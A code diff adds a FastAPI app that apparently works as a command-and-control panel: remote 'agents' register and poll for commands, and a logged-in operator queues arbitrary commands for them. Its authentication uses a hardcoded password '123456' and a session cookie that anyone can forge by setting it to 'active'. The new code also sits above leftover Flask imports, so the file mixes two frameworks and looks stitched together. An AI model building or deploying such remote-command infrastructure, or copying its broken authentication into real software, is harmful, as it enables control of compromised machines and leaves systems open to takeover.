@@ -1,3 +1,66 @@
+from fastapi import FastAPI, Request, Form, status
+from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi.templating import Jinja2Templates
+from typing import Dict
+import threading
+import time
+
+app = FastAPI()
+templates = Jinja2Templates(directory="templates")
+
+ADMIN_USER = "admin"
+ADMIN_PASS = "123456"
+
+agents: Dict[str, dict] = {}
+commands: Dict[str, str] = {}
+
+def is_logged_in(request: Request):
+    return request.cookies.get("session") == "active"
+
+@app.get("/", response_class=HTMLResponse)
+async def dashboard(request: Request):
+    if not is_logged_in(request):
+        return templates.TemplateResponse("login.html", {"request": request})
+    return templates.TemplateResponse("index.html", {
+        "request": request,
+        "agents": agents
+    })
+
+@app.post("/login")
+async def login(username: str = Form(...), password: str = Form(...)):
+    if username == ADMIN_USER and password == ADMIN_PASS:
+        resp = RedirectResponse("/", status_code=status.HTTP_303_SEE_OTHER)
+        resp.set_cookie("session", "active", httponly=True)
+        return resp
+    return HTMLResponse("Access Denied")
+
+@app.get("/logout")
+async def logout():
+    resp = RedirectResponse("/")
+    resp.delete_cookie("session")
+    return resp
+
+@app.post("/register")
+async def register(data: dict):
+    agent_id = data.get("agent_id")
+    agents[agent_id] = data
+    return {"status": "ok"}
+
+@app.post("/poll")
+async def poll(data: dict):
+    agent_id = data.get("agent_id")
+    cmd = commands.pop(agent_id, None)
+    return {"command": cmd} if cmd else {"status": "idle"}
+
+@app.post("/send_command")
+async def send_command(
+    request: Request,
+    agent_id: str = Form(...),
+    command: str = Form(...)
+):
+    if is_logged_in(request):
+        commands[agent_id] = command
+    return RedirectResponse("/", status_code=status.HTTP_303_SEE_OTHER)
 from flask import Flask, render_template, request, jsonify
 import json
 from datetime import datetime
